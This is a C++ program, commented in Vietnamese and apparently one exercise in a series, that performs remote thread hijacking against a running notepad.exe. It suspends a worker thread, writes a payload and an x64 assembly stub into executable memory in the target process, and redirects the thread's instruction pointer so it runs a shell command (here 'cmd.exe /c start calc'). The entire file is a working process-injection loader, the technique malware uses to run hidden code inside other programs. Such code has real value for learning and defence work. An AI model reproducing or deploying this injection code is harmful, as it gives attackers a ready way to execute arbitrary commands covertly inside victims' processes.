#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh logic thực thi mở máy tính
DWORD WINAPI HijackedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa mở máy tính độc lập vị trí
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// GIẢI PHÁP TỐI ƯU: Săn lùng luồng Worker phụ (Background Thread), bỏ qua luồng UI chính để né nghẽn tin nhắn hệ thống
DWORD GetTargetWorkerThreadID(DWORD pid) {
    DWORD mainThreadId = 0;
    DWORD workerThreadId = 0;
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    int threadIndex = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                threadIndex++;
                if (threadIndex == 1) {
                    mainThreadId = te32.th32ThreadID; // Luồng UI chính (Bỏ qua không bắt cóc)
                }
                else {
                    workerThreadId = te32.th32ThreadID; // Bốc chính xác luồng phụ gánh dòng chảy!
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);

    // Trường hợp dự phòng: Nếu ứng dụng quá đơn giản chỉ có đúng 1 luồng, đành trả về luồng chính
    return (workerThreadId != 0) ? workerThreadId : mainThreadId;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 15: REMOTE THREAD HIJACKING" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    // Thực hiện trích xuất luồng Worker phụ an toàn
    DWORD threadId = GetTargetWorkerThreadID(pid);
    if (threadId == 0) {
        std::cerr << "[-] Khong tim thay luong dang chay hop le!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << " | SAN TRUNG LUONG WORKER PHU: " << threadId << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (!hProcess || !hThread) {
        std::cerr << "[-] OpenProcess hoac OpenThread failed!" << std::endl;
        if (hProcess) CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Đóng băng luồng Worker phụ của Notepad
    std::cout << "[*] Dang bat coc va dong bang luong phu..." << std::endl;
    SuspendThread(hThread);

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít cấu trúc
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Đọc ngữ cảnh thanh ghi ban đầu của CPU luồng Worker phụ
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &context)) {
        std::cerr << "[-] GetThreadContext that bai!" << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Khởi tạo cấu trúc tham số dữ liệu tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm và tham số sang RAM tiến trình đích
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)HijackedPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // Tính toán tọa độ đặt đoạn mìn điều hướng ngay sau đuôi hàm thực thi
    PVOID jmpStubAddress = (PVOID)((DWORD_PTR)remoteCodeBuffer + 350);

    // Cấu trúc ASM Stub phẳng sạch bảo toàn qua RET lệnh, trả về chính xác ngữ cảnh luồng phụ
    unsigned char jmpStub[] = {
        0x50,                                                       // push rax       (Tạm cất thanh ghi đa năng)
        0x51,                                                       // push rcx
        0x52,                                                       // push rdx
        0x9C,                                                       // pushfq         (Lưu cờ trạng thái EFLAGS)
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0   (Địa chỉ pRemoteData chứa tham số tuyệt đối)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Địa chỉ hàm thực thi Payload)
        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28  (Cân bằng căn lề Stack Shadow Space)
        0xFF, 0xD0,                                                 // call rax       (Khai hỏa mở Máy tính!)
        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28  (Hoàn trả không gian Ngăn xếp)
        0x9D,                                                       // popfq          (Khôi phục cờ CPU)
        0x5A,                                                       // pop rdx        (Khôi phục nguyên vẹn các thanh ghi phụ)
        0x59,                                                       // pop rcx
        0x58,                                                       // pop rax
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Tọa độ originalRip gốc ban đầu của luồng Worker)
        0x50,                                                       // push rax       (Đẩy Rip gốc vào đỉnh Ngăn xếp)
        0xC3                                                        // ret            (Lệnh RET tự động bốc Rip gốc ra thực thi tiếp cho luồng phụ!)
    };

    // Vá các tọa độ tuyệt đối chuẩn chỉ vào cấu trúc mìn điều hướng Assembly
    *(DWORD_PTR*)(jmpStub + 6) = (DWORD_PTR)pRemoteData;
    *(DWORD_PTR*)(jmpStub + 16) = (DWORD_PTR)remoteCodeBuffer;
    *(DWORD_PTR*)(jmpStub + 44) = (DWORD_PTR)context.Rip;

    // Ghi đoạn mã máy Stub bảo toàn ngăn xếp sang RAM Notepad
    WriteProcessMemory(hProcess, jmpStubAddress, jmpStub, sizeof(jmpStub), NULL);

    // Điều hướng con trỏ chỉ mục lệnh CPU đâm thẳng vào phân đoạn ASM Stub bảo an của luồng Worker phụ
    context.Rip = (DWORD64)jmpStubAddress;

    SetThreadContext(hThread, &context);
    std::cout << "[+] Ep Rip huong vao Worker Thread Stub: 0x" << std::hex << jmpStubAddress << std::endl;

    // Rã đông giải phóng dòng chảy CPU của luồng phụ
    std::cout << "[*] Kich hoat ra dong (ResumeThread). Luong phu se tu dong thuc thi va khoi phuc an toan..." << std::endl;
    ResumeThread(hThread);

    std::cout << "\n[+] Remote Worker Thread Hijacking Successful!" << std::endl;
    std::cout << "[*] Nhan Enter de dong cua so Loader..." << std::endl;
    std::cin.get();

    // Thu hồi tài nguyên Handle sạch bóng Memory Leak
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return EXIT_SUCCESS;
}